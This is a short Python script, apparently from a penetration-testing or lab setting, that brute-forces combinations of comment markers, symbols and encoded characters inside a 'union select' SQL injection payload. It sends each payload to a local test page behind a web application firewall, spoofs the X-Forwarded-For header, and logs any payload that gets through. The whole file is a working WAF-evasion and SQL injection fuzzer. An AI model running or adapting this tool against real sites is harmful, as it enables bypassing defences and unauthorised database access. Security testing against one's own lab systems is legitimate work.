#! -*- encoding:utf-8 -*-
# python3

import requests

fuzz_zs = ['/*', '*/', '/*!', '*', '=', '`', '!', '@', '%', '.', '-', '+', '|', '%00']
fuzz_sz = ['', ' ']
fuzz_ch = ["%0a", "%0b", "%0c", "%0d", "%0e", "%0f", "%0g", "%0h", "%0i", "%0j"]

fuzz = fuzz_zs + fuzz_sz + fuzz_ch
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0",
    "X-Forwarded-For": "127.0.0.1"
}
url_start = "http://127.0.0.1/waf/test.php?id=1"
test_url=requests.get(url_start,headers=headers)
print(test_url.text)

for a in fuzz:
    for b in fuzz:
        for c in fuzz:
            for d in fuzz:
                exp = "/*!union" + a + b + c + d + "select*/ 1,2,3"
                url = url_start + exp
                res = requests.get(url=url, headers=headers)
                print("Now URL:" + url)
                if "user" in res.text:
                    print("Find Fuzz bypass:" + url)
                    with open(r"C:\Users\Leticia\Desktop\results.txt", 'a', encoding='utf-8') as r:
                        r.write(url + "\n")
